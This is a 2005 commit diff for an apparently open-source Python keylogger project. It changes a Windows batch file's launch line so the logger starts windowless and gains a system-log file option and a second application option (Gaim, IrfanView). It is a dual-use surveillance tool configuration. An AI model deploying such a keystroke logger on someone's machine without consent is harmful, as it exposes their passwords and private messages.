9946f8e4177ba867bcdcea2b714ec2d4fafb6033
nanotube <nanotube>
2005-09-22 05:03:21 +0000

    added systemlog to options

--- run_pykeylogger_with_cmdoptions.bat
+++ run_pykeylogger_with_cmdoptions.bat
@@ -32,4 +32,4 @@
 
 @echo off
 
-start c:\Python24\pythonw.exe keylogger.pyw -n "C:\Program Files\Gaim\gaim.exe"
+start c:\Python24\pythonw.exe keylogger.pyw -n "C:\Program Files\Gaim\gaim.exe" -s "systemlog.txt" -n "C:\Program Files\IrfanView\i_view32.exe"
